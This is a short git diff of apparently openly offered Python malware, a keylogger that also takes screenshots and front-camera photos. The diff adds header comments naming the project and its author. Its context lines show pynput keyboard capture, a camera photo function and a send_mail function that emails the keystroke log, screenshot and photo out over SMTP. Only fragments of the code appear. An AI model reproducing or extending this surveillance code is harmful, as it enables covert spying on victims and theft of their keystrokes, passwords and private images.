@@ -1,3 +1,5 @@
+#project : Keylogger with take screenshot and take phto with front camera
+# Auther : kaustav258
 import smtplib
 import threading
 from pynput import keyboard
@@ -53,7 +55,6 @@ def take_photo() -> str:
     cam.release()
     return photo_path
 
-# Function to send an email with the log, screenshot, and photo
 def send_mail(email: str, password: str, message: str, screenshot_path: str = None, photo_path: str = None) -> None:
     msg = MIMEMultipart()
     msg['From'] = email
